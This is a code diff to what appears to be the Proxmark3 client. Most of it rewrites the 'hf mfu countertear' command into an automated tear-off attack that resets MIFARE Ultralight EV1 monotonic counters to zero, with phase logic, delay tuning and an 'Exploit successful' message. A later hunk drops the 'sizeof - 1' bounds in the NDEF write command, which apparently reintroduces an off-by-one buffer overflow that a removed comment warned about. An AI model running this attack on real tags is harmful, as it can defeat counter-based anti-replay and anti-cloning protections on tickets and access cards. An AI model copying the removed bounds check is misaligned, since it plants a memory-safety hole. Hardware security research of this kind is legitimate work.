+                continue;
+            }
+
+            int initial = counter_val;
+            char ihex[7];
+            mfu_cnt_hex(initial, ihex);
+            mfu_cnt_decrement_step(counter, delay_bd, delay_00);
+
+            if (kbd_enter_pressed()) {
+                break;
+            }
+
+            int final_val = 0;
+            if (mfu_cnt_read(counter, &final_val) != PM3_SUCCESS) {
+                continue;
+            }
+
+            if (final_val == MFU_CNT_STUCK_VALUE) {
+                continue;
+            }
+
+            uint8_t tear = 0;
+            mfu_cnt_check_tearing(counter, &tear);   // 0x00 / 0xBD / 0xFF placeholder
+            char fhex[7];
+            char tearstr[4];
+            mfu_cnt_tearfmt(tear, tearstr, sizeof(tearstr));
+            mfu_cnt_hex(final_val, fhex);
+
+            attempt++;
+            PrintAndLogEx(NORMAL, "\r" _RED_("[DEC]") " Att %u | BD/00: %d/%d us | Tear: %s | %s -> %s  " NOLF
+                          , attempt
+                          , delay_bd
+                          , delay_00
+                          , tearstr
+                          , ihex
+                          , fhex
+                         );
+
+            if (final_val < initial && final_val != MFU_CNT_STUCK_VALUE) {
+                PrintAndLogEx(NORMAL, "");
+                PrintAndLogEx(SUCCESS, "Decrement! %s -> %s (delta %d)", ihex, fhex, initial - final_val);
+                // consolidate the drop by normalizing tear flag
+                mfu_cnt_normalize_tear(counter);
+                delay_locked = true;
+                tune_reference = final_val;
+                continue;
+            }
+
+            // tune the delay depending on the counter movement
+            if (final_val > initial) {
+                if (delay_locked) {
+                    delay_locked = false;
+                    tune_reference = final_val;
+                } else {
+                    int new_delay = mfu_cnt_tune_delay(delay_bd, tune_reference, final_val, false);
+                    if (new_delay != delay_bd) {
+                        delay_bd = new_delay;
+                        // delay_00 is intentionally not changed; only BD is adjusted
+                    }
+                    tune_reference = final_val;
+                }
+            } else {
+                if (delay_locked == false) {
+                    int new_delay = mfu_cnt_tune_delay(delay_bd, tune_reference, final_val, false);
+                    if (new_delay != delay_bd) {
+                        delay_bd = new_delay;
+                    }
+                    tune_reference = final_val;
+                }
+            }
+
+        } else if (phase == MFU_CNT_PHASE_PREPARE) {
+
+            if (counter_val < MFU_CNT_PREPARE_TARGET && counter_val != MFU_CNT_STUCK_VALUE) {
+                int diff = MFU_CNT_PREPARE_TARGET - counter_val;
+                // INCREASE takes the value little endian (LSB first)
+                const uint8_t payload[3] = {
+                    (uint8_t)(diff & 0xFF),
+                    (uint8_t)((diff >> 8) & 0xFF),
+                    (uint8_t)((diff >> 16) & 0xFF)
+                };
+                PrintAndLogEx(NORMAL, "\r" _YELLOW_("[PREPARE]") " Incrementing by %d to reach 0x%06X..." NOLF
+                              , diff
+                              , MFU_CNT_PREPARE_TARGET
+                             );
+                mfu_cnt_incr(counter, payload);
+                mfu_cnt_incr(counter, mfu_cnt_incr_zero);
+                continue;
+            }
+
+            if (counter_val == MFU_CNT_PREPARE_TARGET) {
+                PrintAndLogEx(NORMAL, "");
+                PrintAndLogEx(INFO, "Counter at 0x%06X, switching to RESET phase", MFU_CNT_PREPARE_TARGET);
+                phase = MFU_CNT_PHASE_RESET;
+                reset_attempts = 0;
+                reset_reference = MFU_CNT_PREPARE_TARGET;
+                delay_locked = false;
+                continue;
+            }
+
+            phase = MFU_CNT_PHASE_DECREMENT;
+            continue;
+
+        } else {   // MFU_CNT_PHASE_RESET
+
+            int initial = counter_val;
+            char ihex[7];
+            mfu_cnt_hex(initial, ihex);
+            mfu_cnt_reset_step(counter, delay_bd, delay_00);
+
+            if (kbd_enter_pressed()) {
+                break;
+            }
+
+            int final_val = 0;
+            if (mfu_cnt_read(counter, &final_val) != PM3_SUCCESS) {
+                continue;
+            }
+
+            if (final_val == MFU_CNT_STUCK_VALUE) {
+                continue;
+            }
+
+            reset_attempts++;
+
+            char fhex[7];
+            mfu_cnt_hex(final_val, fhex);
+            PrintAndLogEx(NORMAL, "\r" _GREEN_("[RESET]") " Att %u | BD/00: %d/%d us | %s -> %s  " NOLF
+                          , reset_attempts
+                          , delay_bd
+                          , delay_00
+                          , ihex
+                          , fhex
+                         );
+
+            if (final_val == 0) {
+                PrintAndLogEx(NORMAL, "");
+                PrintAndLogEx(SUCCESS, "Exploit successful");
+                *delay_bd_out = delay_bd;
+                *delay_00_out = delay_00;
+                return PM3_SUCCESS;
+            }
+
+            if (final_val > MFU_CNT_PREPARE_TARGET) {
+                PrintAndLogEx(NORMAL, "");
+                PrintAndLogEx(INFO, "Counter increased, returning to DECREMENT");
+                phase = MFU_CNT_PHASE_DECREMENT;
+                tune_reference = final_val;
+                delay_locked = false;
+                continue;
+            }
+
+            if (final_val == initial) {
+                int new_delay = mfu_cnt_tune_delay(delay_bd, reset_reference, final_val, false);
+                if (new_delay != delay_bd) {
+                    delay_bd = new_delay;
+                }
+                reset_reference = final_val;
+            } else if (final_val < initial) {
+                PrintAndLogEx(NORMAL, "");
+                PrintAndLogEx(SUCCESS, "Reset decrement! %s -> %s (delta %d)", ihex, fhex, initial - final_val);
+                delay_locked = true;
+                reset_reference = final_val;
+            }
+            // else final_val slightly higher but still within range - ignore
+        }
+    }
+
+    *delay_bd_out = delay_bd;
+    *delay_00_out = delay_00;
+    return PM3_EOPABORTED;
+}
 
 static int CmdHF14AMfuEv1CounterTearoff(const char *Cmd) {
 
     CLIParserContext *ctx;
     CLIParserInit(&ctx, "hf mfu countertear",
-                  "Tear-off test against a Ev1 counter",
-                  "hf mfu countertear -c 0         -> target counter 0\n"
-                  "hf mfu countertear -c 0 -s 200  -> target counter 0, start delay 200\n"
-                  "hf mfu countertear -c 0 -x 020000  -> target counter 0, increasing the counter by 2 bytes\n"
+                  "Reset a MIFARE Ultralight EV1 monotonic counter with the tear-off technique\n"
+                  "Port of the pyscript mfuev1_counter_reset.py, based on Quarkslab research",
+                  "hf mfu countertear -c 0\n"
+                  "hf mfu countertear -c 0 -f\n"
+                  "hf mfu countertear -c 0 --DelayBD 2720 --Delay00 2705\n"
                  );
 
     void *argtable[] = {
         arg_param_begin,
-        arg_int0("c", "cnt", "<0,1,2>", "Target this EV1 counter (0,1,2)"),
-        arg_int0("i", "inc", "<dec>", "time interval to increase in each iteration - default 10 us"),
-        arg_int0("l", "limit", "<dec>", "test upper limit time - default 3000 us"),
-        arg_int0("s", "start", "<dec>", "test start time - default 500 us"),
-        arg_int0(NULL, "fix", "<dec>", "test fixed loop delay"),
-        arg_str0("x", "hex",  NULL, "3 byte hex to increase counter with - default 010000"),
+        arg_int0("c", "cnt", "<0-2>", "Target this EV1 counter (0,1,2)"),
+        arg_lit0("f", "force", "Skip pre-flight checks"),
+        arg_int0(NULL, "DelayBD", "<dec>", "Manual BD delay (us, disables auto-calibration)"),
+        arg_int0(NULL, "Delay00", "<dec>", "Manual 00 delay (us)"),
         arg_param_end
     };
     CLIExecWithReturn(ctx, Cmd, argtable, false);
 
-    int interval = 0;
-    int time_limit, start_time = 0;
     int counter = arg_get_int_def(ctx, 1, 0);
-    int fixed = arg_get_int_def(ctx, 5, -1);
-
-    if (fixed == -1) {
-        interval = arg_get_int_def(ctx, 2, 10);
-        time_limit = arg_get_int_def(ctx, 3, 3000);
-        start_time = arg_get_int_def(ctx, 4, 500);
-    } else {
-        start_time = fixed;
-        interval = 0;
-        time_limit = fixed;
-    }
-
-    uint8_t newvalue[5] = {0};
-    int newvaluelen = 0;
-    CLIGetHexWithReturn(ctx, 6, newvalue, &newvaluelen);
+    bool force = arg_get_lit(ctx, 2);
+    int delay_arg_bd = arg_get_int_def(ctx, 3, -1);
+    int delay_arg_00 = arg_get_int_def(ctx, 4, -1);
     CLIParserFree(ctx);
 
-    // Validations
-    if (start_time > (time_limit - interval)) {
-        PrintAndLogEx(WARNING, "Wrong start time number");
-        return PM3_EINVARG;
-    }
-    if (time_limit < interval) {
-        PrintAndLogEx(WARNING, "Wrong time limit number");
-        return PM3_EINVARG;
-    }
-    if (time_limit > 65535) {
-        PrintAndLogEx(WARNING, "You can't set delay out of 1..65535 range!");
-        return PM3_EINVARG;
-    }
-    uint8_t cnt_no = 0;
+    // validations
     if (counter < 0 || counter > 2) {
         PrintAndLogEx(WARNING, "Counter must 0, 1 or 2");
         return PM3_EINVARG;
     }
+    // script does not validate the delays either; out-of-range values are
+    // silently rejected by the tear-off hook itself
 
-    cnt_no = (uint8_t)counter;
+    uint8_t cnt_no = (uint8_t)counter;
 
-    iso14a_card_select_t card;
+    PrintAndLogEx(NORMAL, "");
+    PrintAndLogEx(NORMAL, _CYAN_("Attack against the monotonic counters of MFU EV1 using the tear-off technique."));
+    PrintAndLogEx(NORMAL, _CYAN_("Note: If the counter does not reset after a few attempts, increment it to 2^n and retry."));
 
-    // reset counter tear
-    counter_reset_tear(&card, cnt_no);
+    int retval = PM3_SUCCESS;
+    int delay_bd = -1;
+    int delay_00 = 0;
 
-    if (ul_select(&card) == false) {
-        PrintAndLogEx(INFO, "failed to select card,  exiting...");
-        return PM3_ESOFT;
+    if (force == false) {
+        int cnt_val = 0;
+        uint8_t tear = 0;
+        if (mfu_cnt_preflight(cnt_no, &cnt_val, &tear) != PM3_SUCCESS) {
+            PrintAndLogEx(HINT, "HInt: Try `" _YELLOW_("hf mfu countertear -f") "`");
+            retval = PM3_ESOFT;
+            goto exit;
+        }
     }
 
-    uint8_t initial_cnt[3] = {0, 0, 0};
-    int len = ulev1_readCounter(cnt_no, initial_cnt, sizeof(initial_cnt), false);
-    if (len != sizeof(initial_cnt)) {
-        PrintAndLogEx(WARNING, "failed to read counter");
-        return PM3_ESOFT;
+    if (delay_arg_bd == -1) {
+        // auto calibrate
+        int res = mfu_cnt_calibrate(cnt_no, &delay_bd, &delay_00);
+        if (res == PM3_EOPABORTED) {
+            if (delay_bd > -1) {
+                PrintAndLogEx(NORMAL, "");
+                PrintAndLogEx(NORMAL, "Aboarted by user");
+            }
+            // script: stops with no working delay leave silently
+            goto exit;
+        }
+        if (res != PM3_SUCCESS) {
+            retval = PM3_ESOFT;
+            goto exit;
+        }
+        if (delay_arg_00 != -1) {
+            delay_00 = delay_arg_00;
+            PrintAndLogEx(SUCCESS, "Using manual 00 delay: " _GREEN_("%d") " us", delay_00);
+        }
+    } else {
+        delay_bd = delay_arg_bd;
+        delay_00 = (delay_arg_00 != -1) ? delay_arg_00 : (delay_bd - MFU_CNT_DELAY_00_OFFSET);
+        PrintAndLogEx(SUCCESS, "Using manual BD delay: " _GREEN_("%d") " us", delay_bd);
+        if (delay_arg_00 != -1) {
+            PrintAndLogEx(SUCCESS, "Using manual 00 delay: " _GREEN_("%d") " us", delay_00);
+        }
     }
 
-    uint8_t initial_tear[1] = {0};
-    len = ulev1_readTearing(cnt_no, initial_tear, sizeof(initial_tear));
-    DropField();
-    if (len != sizeof(initial_tear)) {
-        PrintAndLogEx(WARNING, "failed to read ANTITEAR,  exiting...  %d", len);
-        return PM3_ESOFT;
-    }
-
-    PrintAndLogEx(INFO, "------------- " _CYAN_("MFU Ev1 Counter Tear off") " -------------");
-    PrintAndLogEx(INFO, "Target counter no     [ " _GREEN_("%u") " ]", counter);
-    PrintAndLogEx(INFO, "counter value         [ " _GREEN_("%s") " ]", sprint_hex_inrow(initial_cnt, sizeof(initial_cnt)));
-    PrintAndLogEx(INFO, "anti-tear value       [ " _GREEN_("%02X") " ]", initial_tear[0]);
-    PrintAndLogEx(INFO, "----------------------------------------------------");
-
-    uint8_t post_tear = 0;
-    uint8_t pre[3] = {0};
-    uint8_t post[3] = {0};
-    uint32_t a = 0, b = 0;
-    uint32_t loop = 0;
-
-    uint8_t cntresp[3] = {0, 0, 0};
-    uint8_t tear[1] = {0};
-    int tlen = 0;
-    int delay_bd;
-    int delay_00;
-    char prestr[20];
-    char poststr[20];
-    int const_post = 0;
-    bool post_tear_check;
-
-    counter_reset_tear(&card, cnt_no);
-    if (ul_select(&card) == false) {
+    if (mfu_cnt_attack_loop(cnt_no, &delay_bd, &delay_00) == PM3_EOPABORTED) {
         PrintAndLogEx(NORMAL, "");
-        PrintAndLogEx(INFO, "BEFORE, failed to select card,  exiting...");
-        return PM3_ESOFT;
-    }
-    msleep(30);
-
-    if (fixed == -1) {
-        for (delay_bd = start_time; delay_bd <= time_limit; delay_bd += interval) {
-
-            if (kbd_enter_pressed()) {
-                PrintAndLogEx(NORMAL, "");
-                PrintAndLogEx(INFO, "\nAborted via keyboard!\n");
-                return PM3_EOPABORTED;
-            }
-
-            if (ul_select(&card) == false) {
-                PrintAndLogEx(NORMAL, "");
-                PrintAndLogEx(FAILED, "AFTER, failed to select card,  exiting...");
-                return PM3_ESOFT;
-            }
-            msleep(30);
-
-            memset(cntresp, 0, sizeof(cntresp));
-            int rlen = ulev1_readCounter(cnt_no, cntresp, sizeof(cntresp), false);
-            if (rlen == sizeof(cntresp)) {
-                memcpy(pre, cntresp, sizeof(pre));
-            } else {
-                PrintAndLogEx(NORMAL, "");
-                PrintAndLogEx(FAILED, "BEFORE, failed to read COUNTER,  exiting...");
-                return PM3_ESOFT;
-            }
-
-            struct p {
-                uint8_t counter;
-                uint32_t tearoff_time;
-                uint8_t value[3];
-            } PACKED payload;
-            payload.counter = cnt_no;
-            payload.tearoff_time = delay_bd;
-            memcpy(payload.value, (uint8_t[]) {0x01, 0x00, 0x00}, sizeof(payload.value));
-
-            clearCommandBuffer();
-            PacketResponseNG resp;
-            SendCommandNG(CMD_HF_MFU_COUNTER_TEAROFF, (uint8_t *)&payload, sizeof(payload));
-            if (WaitForResponseTimeout(CMD_HF_MFU_COUNTER_TEAROFF, &resp, 2000) == false) {
-                PrintAndLogEx(NORMAL, "");
-                PrintAndLogEx(WARNING, "\nTear off command failed");
-                return PM3_ESOFT;
-            }
-
-            DropField();
-            msleep(50);
-
-            if (ul_select(&card) == false) {
-                PrintAndLogEx(NORMAL, "");
-                PrintAndLogEx(FAILED, "AFTER, failed to select card,  exiting...");
-                return PM3_ESOFT;
-            }
-            msleep(30);
-
-            memset(cntresp, 0, sizeof(cntresp));
-            rlen = ulev1_readCounter(cnt_no, cntresp, sizeof(cntresp), false);
-            if (rlen == sizeof(cntresp)) {
-                memcpy(post, cntresp, sizeof(post));
-            } else {
-                PrintAndLogEx(NORMAL, "");
-                PrintAndLogEx(FAILED, "AFTER, failed to read COUNTER,  exiting...");
-                return PM3_ESOFT;
-            }
-
-            tear[0] = 0;
-            tlen = ulev1_readTearing(cnt_no, tear, sizeof(tear));
-            if (tlen == sizeof(tear)) {
-                post_tear = tear[0];
-            } else {
-                PrintAndLogEx(NORMAL, "");
-                PrintAndLogEx(FAILED, "AFTER, failed to read ANTITEAR,  exiting...");
-                return PM3_ESOFT;
-            }
-
-            snprintf(poststr, sizeof(poststr), "%s", sprint_hex_inrow(post, sizeof(post)));
-            post_tear_check = (post_tear == 0xBD);
-            a = (pre[0] | pre[1] << 8 | pre[2]  << 16);
-            b = (post[0] | post[1] << 8 | post[2]  << 16);
-            PrintAndLogEx(INPLACE, " Delay: " _YELLOW_("%d") "   Tear: %s   Counter: " _YELLOW_("%s") ""
-                          , delay_bd
-                          , sprint_hex_inrow(tear, sizeof(tear))
-                          , poststr
-
-                         );
-
-            DropField();
-            msleep(50);
-
-            if (b != a && post_tear == 0xBD) {
-                if (b < a && b == 0) {
-                    counter_reset_tear(&card, cnt_no);
-                    counter_reset_tear(&card, cnt_no);
-
-                    if (ul_select(&card) == false) {
-                        PrintAndLogEx(NORMAL, "");
-                        PrintAndLogEx(FAILED, "BEFORE, failed to select card,  looping...");
-                        continue;
-                    }
-                    msleep(30);
-
-                    tear[0] = 0;
-                    tlen = ulev1_readTearing(cnt_no, tear, sizeof(tear));
-                    if (tlen == sizeof(tear)) {
-                        post_tear = tear[0];
-                    } else {
-                        PrintAndLogEx(NORMAL, "");
-                        PrintAndLogEx(FAILED, "AFTER, failed to read ANTITEAR,  exiting...");
-                        continue;
-                    }
-                    post_tear_check = (post_tear == 0xBD);
-                    PrintAndLogEx(INFO, "------------------- " _GREEN_("ZEROS value!") " -------------------");
-
-                    PrintAndLogEx(SUCCESS, "Attempt:        " _YELLOW_("%d"), loop);
-                    PrintAndLogEx(SUCCESS, "Delay BD:    " _YELLOW_("%d"), delay_bd);
-                    PrintAndLogEx(SUCCESS, "Counter:        %s -> " _GREEN_("%s"), prestr, poststr);
-                    PrintAndLogEx(SUCCESS, "Tear status:    0x%02X ( %s )",
-                                  post_tear,
-                                  post_tear_check ? _GREEN_("OK") : _RED_("NOT OK"));
-
-                    PrintAndLogEx(INFO, "----------------------------------------------------");
-                    DropField();
-                    return PM3_SUCCESS;
-                }
-                const_post = b;
-                PrintAndLogEx(NORMAL, "");
-                PrintAndLogEx(SUCCESS, "BD delay found: " _GREEN_("%d"), delay_bd);
-                DropField();
-                break;
-            }
-
-        }
-    } else if (fixed != -1) delay_bd = fixed;
-
-    if (ul_select(&card) == false) {
-        PrintAndLogEx(NORMAL, "");
-        PrintAndLogEx(INFO, "BEFORE, failed to select card,  exiting...");
-        return PM3_ESOFT;
-    }
-    msleep(30);
-
-    for (delay_00 = 100; delay_00 <= 2000; delay_00 += 10) {
-
-        if (kbd_enter_pressed()) {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(INFO, "\nAborted via keyboard!\n");
-            return PM3_EOPABORTED;
-        }
-
-        struct p {
-            uint8_t counter;
-            uint32_t tearoff_time;
-            uint8_t value[3];
-        } PACKED payload;
-        payload.counter = cnt_no;
-        payload.tearoff_time = delay_00;
-        memcpy(payload.value, (uint8_t[]) {0x00, 0x00, 0x00}, sizeof(payload.value));
-
-        clearCommandBuffer();
-        PacketResponseNG resp;
-        SendCommandNG(CMD_HF_MFU_COUNTER_TEAROFF, (uint8_t *)&payload, sizeof(payload));
-        if (WaitForResponseTimeout(CMD_HF_MFU_COUNTER_TEAROFF, &resp, 2000) == false) {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(WARNING, "\nTear off command failed");
-            return PM3_ESOFT;
-        }
-
-        DropField();
-        msleep(50);
-
-        if (ul_select(&card) == false) {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(FAILED, "AFTER, failed to select card,  exiting...");
-            return PM3_ESOFT;
-        }
-        msleep(30);
-
-
-        tear[0] = 0;
-        tlen = ulev1_readTearing(cnt_no, tear, sizeof(tear));
-        if (tlen == sizeof(tear)) {
-            post_tear = tear[0];
-        } else {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(FAILED, "AFTER, failed to read ANTITEAR,  exiting...");
-            return PM3_ESOFT;
-        }
-
-        post_tear_check = (post_tear == 0xBD);
-
-        PrintAndLogEx(INPLACE, " Delay: " _YELLOW_("%d") "   Tear: %s   Counter: " _YELLOW_("%s") ""
-                      , delay_00
-                      , sprint_hex_inrow(tear, sizeof(tear))
-                      , poststr
-                     );
-        if (post_tear == 0x00) {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(SUCCESS, "00 delay found: " _GREEN_("%d"), delay_00);
-            DropField();
-            break;
-        }
-
+        PrintAndLogEx(NORMAL, "[x] Interrupted by user.");
+        goto exit;
     }
 
-    counter_reset_tear(&card, cnt_no);
-    counter_reset_tear(&card, cnt_no);
-
-    while (true) {
-
-        loop++;
-
-        if (kbd_enter_pressed()) {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(INFO, "\nAborted via keyboard!\n");
-            return PM3_EOPABORTED;
-        }
-
-        if (ul_select(&card) == false) {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(FAILED, "BEFORE, failed to select card,  looping...");
-            continue;
-        }
-        msleep(30);
-
-        memset(cntresp, 0, sizeof(cntresp));
-        int rlen = ulev1_readCounter(cnt_no, cntresp, sizeof(cntresp), false);
-        if (rlen == sizeof(cntresp)) {
-            memcpy(pre, cntresp, sizeof(pre));
-        } else {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(FAILED, "BEFORE, failed to read COUNTER,  exiting...");
-            continue;
-        }
-
-        struct p {
-            uint8_t counter;
-            uint32_t tearoff_time;
-            uint8_t value[3];
-        } PACKED payload;
-        payload.counter = cnt_no;
-        payload.tearoff_time = delay_bd;
-        if (newvaluelen > 0) {
-            memcpy(payload.value, newvalue, sizeof(payload.value));
-        } else {
-            memcpy(payload.value, (uint8_t[]) {0x01, 0x00, 0x00}, sizeof(payload.value));
-        }
-
-        clearCommandBuffer();
-        PacketResponseNG resp;
-        SendCommandNG(CMD_HF_MFU_COUNTER_TEAROFF, (uint8_t *)&payload, sizeof(payload));
-        if (WaitForResponseTimeout(CMD_HF_MFU_COUNTER_TEAROFF, &resp, 2000) == false) {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(WARNING, "\nTear off command failed");
-            continue;
-        }
-
-        DropField();
-        msleep(50);
-
-        if (ul_select(&card) == false) {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(FAILED, "AFTER, failed to select card,  exiting...");
-            continue;
-        }
-        msleep(30);
-
-        payload.counter = cnt_no;
-        payload.tearoff_time = delay_00;
-        memcpy(payload.value, (uint8_t[]) {0x00, 0x00, 0x00}, sizeof(payload.value));
-
-        clearCommandBuffer();
-        SendCommandNG(CMD_HF_MFU_COUNTER_TEAROFF, (uint8_t *)&payload, sizeof(payload));
-        if (WaitForResponseTimeout(CMD_HF_MFU_COUNTER_TEAROFF, &resp, 2000) == false) {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(WARNING, "\nTear off command failed");
-            continue;
-        }
-
-        DropField();
-        msleep(50);
-
-        if (ul_select(&card) == false) {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(FAILED, "BEFORE, failed to select card,  looping...");
-            continue;
-        }
-        msleep(30);
-
-        memset(cntresp, 0, sizeof(cntresp));
-        rlen = ulev1_readCounter(cnt_no, cntresp, sizeof(cntresp), false);
-        if (rlen == sizeof(cntresp)) {
-            memcpy(post, cntresp, sizeof(post));
-        } else {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(FAILED, "AFTER, failed to read COUNTER,  exiting...");
-            continue;
-        }
-
-        tear[0] = 0;
-        tlen = ulev1_readTearing(cnt_no, tear, sizeof(tear));
-        if (tlen == sizeof(tear)) {
-            post_tear = tear[0];
-        } else {
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(FAILED, "AFTER, failed to read ANTITEAR,  exiting...");
-            continue;
-        }
-
-        snprintf(prestr, sizeof(prestr), "%s", sprint_hex_inrow(pre, sizeof(pre)));
-
-        snprintf(poststr, sizeof(poststr), "%s", sprint_hex_inrow(post, sizeof(post)));
-
-        post_tear_check = (post_tear == 0xBD);
-        a = (pre[0] | pre[1] << 8 | pre[2]  << 16);
-        b = (post[0] | post[1] << 8 | post[2]  << 16);
-
-        // A != B
-        if (memcmp(pre, post, sizeof(pre)) != 0) {
-
-            if (b < a) {
-
-                PrintAndLogEx(NORMAL, "");
-
-                if (b == 0) {
-                    counter_reset_tear(&card, cnt_no);
-                    counter_reset_tear(&card, cnt_no);
-
-                    if (ul_select(&card) == false) {
-                        PrintAndLogEx(NORMAL, "");
-                        PrintAndLogEx(FAILED, "BEFORE, failed to select card,  looping...");
-                        continue;
-                    }
-                    msleep(30);
-
-                    tear[0] = 0;
-                    tlen = ulev1_readTearing(cnt_no, tear, sizeof(tear));
-                    if (tlen == sizeof(tear)) {
-                        post_tear = tear[0];
-                    } else {
-                        PrintAndLogEx(NORMAL, "");
-                        PrintAndLogEx(FAILED, "AFTER, failed to read ANTITEAR,  exiting...");
-                        continue;
-                    }
-                    post_tear_check = (post_tear == 0xBD);
-
-                    PrintAndLogEx(INFO, "------------------- " _GREEN_("ZEROS value!") " -------------------");
-
-                    PrintAndLogEx(SUCCESS, "Attempt:        " _YELLOW_("%d"), loop);
-                    PrintAndLogEx(SUCCESS, "Delay BD/00:    " _YELLOW_("%d/%d"), delay_bd, delay_00);
-                    PrintAndLogEx(SUCCESS, "Counter:        %s -> " _GREEN_("%s"), prestr, poststr);
-                    PrintAndLogEx(SUCCESS, "Tear status:    0x%02X ( %s )",
-                                  post_tear,
-                                  post_tear_check ? _GREEN_("OK") : _RED_("NOT OK"));
-
-                    PrintAndLogEx(INFO, "----------------------------------------------------");
-                    break;
-                }
-
-                else {
-                    PrintAndLogEx(INFO, "----------------------- " _GREEN_("LESS") " -----------------------");
-
-                    PrintAndLogEx(SUCCESS, "Attempt:        " _YELLOW_("%d"), loop);
-                    PrintAndLogEx(SUCCESS, "Delay BD/00:    " _YELLOW_("%d/%d"), delay_bd, delay_00);
-                    PrintAndLogEx(SUCCESS, "Counter:        %s -> " _GREEN_("%s"), prestr, poststr);
-                    PrintAndLogEx(SUCCESS, "Tear status:    0x%02X ( %s )",
-                                  post_tear,
-                                  post_tear_check ? _RED_("NOT OK") : _GREEN_("OK"));
-
-                    PrintAndLogEx(INFO, "----------------------------------------------------");
-                    continue;
-                }
-
-            }
-
-        }
-
-        PrintAndLogEx(NORMAL, "\r" _YELLOW_("[ %d ]") " Delay BD/00: " _YELLOW_("%d/%d") "   Counter: %s -> %s   Tear: 0x%02X   ( %s )" NOLF
-                      , loop
-                      , delay_bd
-                      , delay_00
-                      , prestr
-                      , poststr
-                      , post_tear
-                      , post_tear_check ? _RED_("NOT OK") : _GREEN_("OK")
-                     );
-
-        if (loop % 20 == 0 && const_post == b && delay_bd != time_limit && fixed == -1) {
-            delay_bd += interval;
-            const_post = b;
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(INFO, "BD delay increased "  _GREEN_("%d"), delay_bd);
-        } else if (loop % 20 == 0 && b - const_post > 10 && delay_bd != start_time && fixed == -1) {
-            delay_bd -= interval;
-            const_post = b;
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(INFO, "BD delay reduced " _RED_("%d"), delay_bd);
-        }
-        if (loop % 20 == 0) const_post = b;
-
-        if (loop % 5 == 0 && post_tear_check) {
-            delay_00 += 5;
-            PrintAndLogEx(NORMAL, "");
-            PrintAndLogEx(INFO, "00 delay increased "  _GREEN_("%d"), delay_00);
-        }
-    }
-
-    DropField();
-    msleep(50);
-    return PM3_SUCCESS;
+exit:
+    // deactivate the tear-off hook on any exit path
+    mfu_cnt_tear_off();
+    return retval;
 }
 
 //
@@ -7485,23 +7796,21 @@ int CmdHF14MfuNDEFWrite(const char *Cmd) {
     CLIGetHexWithReturn(ctx, 1, authenticationkey, &ak_len);
     swap_endian = arg_get_lit(ctx, 2);
 
-    // CLIParamStrToBuf copies the trailing NUL as well but only rejects lengths
-    // strictly above maxdatalen, so leave room for that byte
     int urilen = 0;
     char uri[1024] = {0};
-    CLIParamStrToBuf(arg_get_str(ctx, 3), (uint8_t *)uri, sizeof(uri) - 1, &urilen);
+    CLIParamStrToBuf(arg_get_str(ctx, 3), (uint8_t *)uri, sizeof(uri), &urilen);
 
     int textlen = 0;
     char text[1024] = {0};
-    CLIParamStrToBuf(arg_get_str(ctx, 4), (uint8_t *)text, sizeof(text) - 1, &textlen);
+    CLIParamStrToBuf(arg_get_str(ctx, 4), (uint8_t *)text, sizeof(text), &textlen);
 
     int langlen = 0;
     char lang[32] = {0};
-    CLIParamStrToBuf(arg_get_str(ctx, 5), (uint8_t *)lang, sizeof(lang) - 1, &langlen);
+    CLIParamStrToBuf(arg_get_str(ctx, 5), (uint8_t *)lang, sizeof(lang), &langlen);
 
     int aarlen = 0;
     char aar[256] = {0};
-    CLIParamStrToBuf(arg_get_str(ctx, 6), (uint8_t *)aar, sizeof(aar) - 1, &aarlen);
+    CLIParamStrToBuf(arg_get_str(ctx, 6), (uint8_t *)aar, sizeof(aar), &aarlen);
 
     int rawlen = 0;
     uint8_t raw[MFU_NDEF_MAX_BYTES] = {0};
@@ -7732,7 +8041,7 @@ int CmdHF14MfuNDEFWrite(const char *Cmd) {
     if (ndef_print_CC(data + 12) == PM3_ESOFT) {
         DropField();
         PrintAndLogEx(ERR, "Error: tag didnt contain a NDEF Container");
-        PrintAndLogEx(HINT, "Hint: the tag needs to be NDEF formatted first");
+        PrintAndLogEx(HINT, "Hint: Tag needs to be NDEF formatted first");
         return PM3_ESOFT;
     }
 
@@ -7975,9 +8284,8 @@ int CmdHF14MfuNDEFFormat(const char *Cmd) {
     if (fmt == NULL) {
         if (cc_len == 0) {
             PrintAndLogEx(FAILED, "Don't know the Capability Container for this tag type");
-            PrintAndLogEx(INFO, "Block 3 is One Time Programmable, a wrong value can not be undone,");
-            PrintAndLogEx(INFO, "so this command will not guess one.");
-            PrintAndLogEx(HINT, "Hint: supply it yourself with `" _YELLOW_("hf mfu ndefformat -d <hex> --force") "`");
+            PrintAndLogEx(INFO, "Block 3 is One Time Programmable, a wrong value can not be undone");
+            PrintAndLogEx(HINT, "Hint: Use `" _YELLOW_("hf mfu ndefformat -d <hex> --force") "`");
             return PM3_ENOTIMPL;
         }
         if (force == false) {
@@ -8011,7 +8319,7 @@ int CmdHF14MfuNDEFFormat(const char *Cmd) {
             PrintAndLogEx(INFO, "    requested... %d bytes ( MLEN %02X )", cc_override[2] * 8, cc_override[2]);
             PrintAndLogEx(INFO, "    tag holds... %d bytes ( MLEN %02X )", fmt->page[0][2] * 8, fmt->page[0][2]);
             PrintAndLogEx(INFO, "Block 3 is One Time Programmable, this can not be undone.");
-            PrintAndLogEx(HINT, "Hint: add `" _YELLOW_("--force") "` if you really mean it");
+            PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("--force") "` if you really mean it");
             return PM3_EINVARG;
         }
 
@@ -8195,7 +8503,7 @@ int CmdHF14MfuNDEFFormat(const char *Cmd) {
         PrintAndLogEx(FAILED, "Capability Container did not take");
         PrintAndLogEx(INFO, "    wanted...... " _GREEN_("%s"), sprint_hex_inrow(pages[0], MFU_BLOCK_SIZE));
